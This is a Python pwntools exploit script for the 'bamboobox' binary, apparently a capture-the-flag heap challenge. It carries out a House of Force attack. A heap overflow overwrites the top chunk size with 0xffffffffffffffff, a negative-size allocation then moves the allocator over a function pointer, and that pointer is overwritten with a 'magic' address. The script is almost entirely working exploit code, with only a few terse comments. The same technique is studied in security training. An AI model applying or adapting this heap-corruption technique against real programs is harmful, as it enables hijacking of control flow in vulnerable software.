#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
context.log_level = 'debug'
context.terminal = ['terminator','-x','bash','-c']
r = process('./bamboobox')
def additem(length,name):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(length))
    r.recvuntil(":")
    r.sendline(name)
def modify(idx,length,name):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))
    r.recvuntil(":")
    r.sendline(str(length))
    r.recvuntil(":")
    r.sendline(name)
def remove(idx):
    r.recvuntil(":")
    r.sendline("4")
    r.recvuntil(":")
    r.sendline(str(idx))
def show():
    r.recvuntil(":")
    r.sendline("1")
magic = 0x400d49
additem(0x100,"ddaa")
modify(0,0x110,"a"*0x100 + p64(0) + p64(0xffffffffffffffff))
additem(-(0x10+0x10)-(0x10+0x100)-(0x10),"dada")#evil_size
additem(0x20,p64(magic)*2)#change ptr here!!
r.sendline('5')
r.interactive()